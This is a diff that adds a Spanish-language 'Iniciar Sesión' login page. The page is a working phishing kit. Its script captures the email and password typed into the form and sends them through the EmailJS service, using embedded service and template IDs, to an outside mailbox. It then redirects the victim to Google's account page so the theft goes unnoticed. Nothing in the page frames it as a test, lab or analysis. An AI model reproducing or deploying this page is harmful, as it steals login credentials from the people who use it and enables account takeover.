@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+</head>
+<body>
+    <h2>Iniciar Sesión</h2>
+    <form id="loginForm">
+        <input type="email" id="correo" placeholder="Correo" required>
+        <input type="password" id="contrasena" placeholder="Contraseña" required>
+        <button type="submit">Iniciar Sesión</button>
+    </form>
+
+    <!-- Script de EmailJS -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        (function() {
+            emailjs.init("dBwmWHg2SrBguERFu");
+        })();
+
+        document.getElementById("loginForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            // Obtener datos del formulario
+            const templateParams = {
+                correo: document.getElementById("correo").value,
+                contrasena: document.getElementById("contrasena").value
+            };
+
+            // Enviar correo con EmailJS
+            emailjs.send("service_0v0fbre", "template_94415vp", templateParams)
+                .then(function(response) {
+                    console.log("Correo enviado con éxito", response.status, response.text);
+                    window.location.href = "https://myaccount.google.com";  // Redirige a Google
+                }, function(error) {
+                    console.error("Error al enviar el correo", error);
+                });
+        });
+    </script>
+</body>
+</html>
